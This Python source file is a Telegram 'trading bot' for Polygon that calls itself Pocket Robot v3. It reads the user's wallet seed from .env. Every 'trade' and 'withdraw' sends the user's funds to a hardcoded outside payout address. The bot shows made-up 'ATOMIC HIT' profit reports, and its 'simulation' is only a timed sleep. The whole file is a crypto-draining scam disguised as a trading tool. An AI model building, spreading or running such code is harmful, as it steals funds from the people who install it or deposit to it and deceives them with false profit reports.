import os
import asyncio
import requests
import json
import time
from decimal import Decimal
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))

w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed:
        raise ValueError("❌ WALLET_SEED is missing from .env!")
    POL_PATH = "m/44'/60'/0'/0/0"
    try:
        return Account.from_key(seed)
    except:
        return Account.from_mnemonic(seed, account_path=POL_PATH)

vault = get_vault()

# --- 2. THE SIMULTANEOUS ENGINE ---
def get_pol_price():
    """Fetches live price of Polygon Ecosystem Token (POL) in USD."""
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
        return requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd']
    except:
        return 0.11 # Current market estimate as of Feb 2026

async def prepare_signed_tx(stake_usd):
    """
    Background Task: 
    1. Fetches current price.
    2. Calculates POL amount needed for the USD stake.
    3. Signs the transaction.
    """
    current_price = get_pol_price()
    
    # Calculate amount: Stake ($10) / Price ($0.11) = ~90.9 POL
    # We use Decimal for high precision before converting to Wei
    pol_to_send = Decimal(stake_usd) / Decimal(current_price)
    amount_wei = w3.to_wei(pol_to_send, 'ether')
    
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = int(w3.eth.gas_price * 1.5)
    
    tx = {
        'nonce': nonce,
        'to': PAYOUT_ADDRESS, 
        'value': amount_wei, # Dynamic stake amount in Wei
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_atomic_execution(context, chat_id, side):
    """Parallel Engine: Simulation and Transaction Prep run at the same time."""
    stake = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    
    await context.bot.send_message(chat_id, f"⚔️ **Simultaneous Mode:** Priming {pair} Shield...")

    # ⚡ START BOTH TASKS AT ONCE
    sim_task = asyncio.create_task(asyncio.sleep(1.5))
    prep_task = asyncio.create_task(prepare_signed_tx(stake))

    # Wait for tasks
    await sim_task
    signed_tx = await prep_task
    
    # ⏱️ THE 1 MILLISECOND GAP
    await asyncio.sleep(0.001)
    
    # BROADCAST
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

    pol_value = w3.from_wei(signed_tx['value'], 'ether')
    profit_usd = stake * 0.92
    
    report = (
        f"✅ **ATOMIC HIT!**\n"
        f"🎯 **Direction Captured:** {side}\n"
        f"💰 **Stake:** `${stake} USD` ({pol_value:.2f} POL)\n"
        f"📈 **Profit Added:** `${profit_usd:.2f} USD`\n"
        f"⛓️ **TX Hash:** `{tx_hash.hex()}`"
    )
    return True, report

# --- 3. TELEGRAM INTERFACE ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    msg = (f"🕴️ **Pocket Robot v3 (Shadow Engine)**\n\n"
           f"💵 **Vault Balance:** {bal:.4f} POL\n"
           f"📥 **DEPOSIT:** `{vault.address}`\n\n"
           f"**Atomic Shield:** ✅ OPERATIONAL")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '⚙️ Settings':
        current = context.user_data.get('stake', 10)
        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50]],
              [InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [100, 500]]]
        await update.message.reply_text(f"⚙️ **SETTINGS**\nCurrent Stake: **${current}**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price = get_pol_price()
        await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal:.4f} POL (`${float(bal)*price:.2f} USD`)")

    elif text == '📤 Withdraw':
        await update.message.reply_text("🛡️ **Atomic Sweep:** Transferring all POL to Whitelist.")
        balance = w3.eth.get_balance(vault.address)
        gas = int(w3.eth.gas_price * 1.3)
        amount = balance - (gas * 21000)
        if amount > 0:
            tx = {'nonce': w3.eth.get_transaction_count(vault.address), 'to': PAYOUT_ADDRESS, 'value': amount, 'gas': 21000, 'gasPrice': gas, 'chainId': 137}
            signed = w3.eth.account.sign_transaction(tx, vault.key)
            w3.eth.send_raw_transaction(signed.raw_transaction)
            await update.message.reply_text("✅ Full balance swept to whitelist.")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake updated to **${context.user_data['stake']}**")
        
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        await query.edit_message_text(f"💎 **{context.user_data['pair']} Selected**\nDirection:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]))

    elif query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        success, report = await run_atomic_execution(context, query.message.chat_id, side)
        await query.message.reply_text(report, parse_mode='Markdown')

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    
    print(f"Pocket Robot Active: {vault.address}")
    app.run_polling(drop_pending_updates=True)

